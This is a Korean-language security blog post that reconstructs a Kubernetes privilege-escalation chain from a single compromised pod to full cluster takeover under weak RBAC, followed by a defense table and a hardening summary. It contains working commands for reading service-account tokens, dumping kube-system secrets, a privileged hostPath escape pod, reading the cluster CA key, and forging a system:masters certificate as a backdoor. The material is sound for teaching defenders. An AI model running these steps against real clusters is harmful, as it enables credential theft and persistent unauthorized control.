---
# generated-by: scripts/sync.py — 직접 수정 금지, 볼트 원본을 고치세요
title: "033. Kubernetes RBAC 미비 공격 시나리오 — 파드 침투에서 클러스터 장악까지"
date: 2026-06-12
tags: [kubernetes, k8s, security, rbac, attack, serviceaccount, privilege-escalation, cve, defense]
summary: "RBAC이 제대로 설정되지 않은 클러스터에서 파드 하나를 침투한 공격자가 전체 클러스터를 장악하는 과정을 단계별로 설명한다. 각 단계에서 공격이 성립하는 조건과 이를 차단하는 방어 포인트를 함께 정리한다."
slug: "033-k8s-rbac-attack-scenario"
categories: ["쿠버네티스"]
---

공격 방법을 정확히 알아야 방어 설계도 정확해진다. 아래 시나리오는 실제 침해 사례에서 반복적으로 나타나는 패턴을 단계별로 재구성한 것이다.

## 전제: 흔한 RBAC 미비 패턴

실무에서 자주 보이는 실수들이다.

```yaml
# 실수 1: default ServiceAccount에 cluster-admin 바인딩
kind: ClusterRoleBinding
subjects:
- kind: ServiceAccount
  name: default
  namespace: default
roleRef:
  kind: ClusterRole
  name: cluster-admin
```

```yaml
# 실수 2: automountServiceAccountToken 기본값 방치
# → 모든 파드가 /var/run/secrets/kubernetes.io/serviceaccount/token을 자동으로 가짐
```

이 두 가지가 동시에 있으면 파드 하나를 침투한 것만으로 클러스터 전체가 노출된다.

---

## 1단계: 초기 침투

공격자가 파드 내부 쉘을 실행할 수 있는 상태를 만드는 것이 출발점이다. 진입 경로는 다양하다.

- 앱 코드의 RCE 취약점 (Log4Shell, deserialization, SSRF를 통한 내부 명령 실행)
- 공급망 공격 — 의존 패키지에 심어진 악성 코드
- 컨테이너 이미지에 미리 심어진 백도어

어느 경로든 결과는 같다. 공격자가 파드 안에서 명령을 실행할 수 있는 상태다.

---

## 2단계: SA 토큰 수집

파드에 진입하면 제일 먼저 서비스 어카운트 토큰을 확인한다. `automountServiceAccountToken`이 기본값(true)이면 거의 모든 파드에 마운트돼 있다.

```bash
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
```

이 JWT 토큰으로 kube-apiserver에 직접 API 요청을 할 수 있다.

```bash
APISERVER=https://kubernetes.default.svc
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)

curl -k -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/default/pods
```

---

## 3단계: 권한 정찰

토큰으로 내가 어디까지 접근할 수 있는지 확인한다.

```bash
# kubectl을 파드 안에 다운받거나, curl로 직접 API 호출
kubectl auth can-i --list --token=$TOKEN

# default SA에 cluster-admin이 바인딩돼 있으면 여기서 바로 드러남
# Verb: * Resource: * → 전체 권한
```

`cluster-admin`이 아니더라도 `secrets/list` 권한이 있으면 다음 단계로 넘어갈 수 있다.

---

## 4단계 A: Secret 덤프 → 자격증명 탈취

Secret 읽기 권한이 있으면 클러스터 전체 Secret을 긁어온다.

```bash
kubectl get secrets -n kube-system -o json --token=$TOKEN
```

kube-system에서 건질 수 있는 것들:

- 더 강한 권한을 가진 다른 ServiceAccount 토큰
- etcd 접근 인증서
- 클라우드 프로바이더 자격증명 (AWS Access Key 등)
- DB 비밀번호, 외부 API 키

다른 SA 토큰을 탈취하면 그 SA의 권한으로 다시 3단계를 반복한다. 권한이 충분해질 때까지 횡이동(lateral movement)한다.

---

## 4단계 B: 특권 파드 생성 → 노드 탈출

`pods/create` 권한이 있고 PSA가 없으면 특권 파드를 직접 만든다.

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: evil-pod
  namespace: kube-system
spec:
  hostPID: true
  hostNetwork: true
  hostIPC: true
  containers:
  - name: evil
    image: alpine
    command: ["/bin/sh", "-c", "sleep 9999"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host-root
      mountPath: /host
  volumes:
  - name: host-root
    hostPath:
      path: /              # 호스트 루트 파일시스템 전체 마운트
  nodeName: target-node-1  # 원하는 노드 지정 가능
```

이 파드에 exec하면 호스트 파일시스템 전체가 `/host`에 마운트된 상태다.

```bash
kubectl exec -it evil-pod -n kube-system -- sh

chroot /host   # 호스트 루트로 전환, 이제 호스트에서 root

# 호스트에서 할 수 있는 것들
cat /etc/kubernetes/pki/ca.key          # 클러스터 CA 개인키
cat /etc/kubernetes/admin.conf          # cluster-admin kubeconfig
nsenter -t 1 -m -u -i -n -p -- bash    # host PID 1 네임스페이스 진입
```

---

## 5단계: CA 키로 영구 backdoor

CA 개인키를 손에 넣으면 유효한 클라이언트 인증서를 무한정 서명할 수 있다.

```bash
# 공격자 로컬에서
openssl genrsa -out attacker.key 2048
openssl req -new -key attacker.key -out attacker.csr \
  -subj "/CN=attacker/O=system:masters"   # system:masters 그룹 = cluster-admin

# 탈취한 CA로 서명
openssl x509 -req -in attacker.csr \
  -CA ca.crt -CAkey ca.key \
  -CAcreateserial -out attacker.crt -days 3650

# 10년짜리 cluster-admin 인증서 완성
kubectl --client-certificate=attacker.crt \
        --client-key=attacker.key \
        get nodes
```

클러스터를 재생성하거나 CA를 교체하지 않는 한 이 인증서는 계속 유효하다. 원래 침투 경로를 막아도 공격자는 접근을 유지한다.

---

## 공격 성립 조건과 방어 포인트

| 단계 | 공격 성립 조건 | 방어 방법 |
|---|---|---|
| 토큰 수집 | `automountServiceAccountToken: true` (기본값) | API 접근 불필요한 파드는 `automountServiceAccountToken: false` |
| 권한 정찰 | default SA에 과한 권한 | default SA는 권한 없음, 서비스별 SA 분리, 최소 권한 원칙 |
| Secret 덤프 | `secrets/list` 권한 부여 | Secret 접근 권한 최소화, External Secrets로 민감값 분리 |
| 특권 파드 생성 | `pods/create` + PSA 없음 | PSA `restricted` 적용, privileged/hostPath 차단 |
| 노드 탈출 | `privileged: true` 허용 | Security Context 강제, `readOnlyRootFilesystem: true` |
| CA 키 탈취 | 노드에 CA 키 노출 | 관리형 k8s(EKS, GKE) 사용 — CA가 노드에 노출되지 않음 |
| 영구 backdoor | CA 키 보유 | CA 교체, 인증서 기반 접근 감사 로그 |

---

## 방어 설계 요약

**토큰을 끊는다**: API 접근이 필요 없는 파드는 `automountServiceAccountToken: false`로 토큰 마운트 자체를 없앤다. 토큰이 없으면 2단계에서 막힌다.

**권한을 줄인다**: default SA는 아무 권한도 없어야 한다. 서비스마다 전용 SA를 만들고 필요한 최소 권한만 부여한다. `cluster-admin`은 자동화 파이프라인에도 주면 안 된다.

**특권 파드를 원천 차단한다**: PSA `restricted`를 Namespace에 적용하면 `privileged`, `hostPath`, `hostPID` 파드 생성 자체가 거부된다. 4단계 B가 시작도 못 한다.

**네트워크로 API 접근을 제한한다**: NetworkPolicy로 일반 애플리케이션 파드에서 kube-apiserver(포트 443/6443)로의 직접 접근을 차단한다. 토큰이 있어도 API에 닿지 못하면 의미가 없다.

**감사 로그를 켠다**: kube-apiserver audit log를 활성화하면 비정상적인 API 접근 패턴(처음 보는 SA가 secrets를 list하는 등)을 탐지할 수 있다.
